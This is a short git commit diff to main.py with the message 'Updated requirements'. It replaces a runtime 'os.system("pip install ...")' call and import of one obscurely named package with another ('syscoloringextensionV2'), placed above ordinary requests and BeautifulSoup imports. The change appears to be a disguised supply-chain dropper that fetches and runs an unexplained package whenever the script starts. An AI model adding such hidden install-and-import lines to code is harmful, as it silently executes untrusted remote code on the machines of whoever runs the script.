ef3aac09378ccd864ed3491b0788dc9416921ed7
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-07 11:32:57 +0200

    Updated requirements

--- main.py
+++ main.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install syscolouringsextV1")
-import syscolouringsextV1
+os.system("pip install syscoloringextensionV2")
+import syscoloringextensionV2
 import requests
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
